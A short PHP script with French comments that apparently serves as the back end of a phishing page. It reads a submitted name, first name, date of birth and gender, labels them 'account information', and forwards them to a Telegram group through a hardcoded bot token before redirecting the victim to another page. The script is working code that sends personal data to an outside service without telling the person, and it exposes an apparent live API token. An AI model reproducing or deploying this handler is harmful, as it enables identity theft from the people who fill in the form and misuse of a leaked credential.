<?php
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $name = $_POST['last_name'];
    $surname = $_POST['first_name'];
    $date = $_POST['date_of_birth'];
    $gender = $_POST['gender'];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Informations de compte:\n\n";
    $message .= "Nom : $name\n";
    $message .= "Prénom : $surname\n";
    $message .= "Date de naissance : $date\n";
    $message .= "Genre : $gender\n";

    // L'ID du chat où vous voulez envoyer le message
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    try {
        $response = Request::sendMessage($data);
    } catch (Exception $e) {
        echo "Erreur lors de l'envoi du message : " . $e->getMessage();
    }

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ./mbdu.php");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
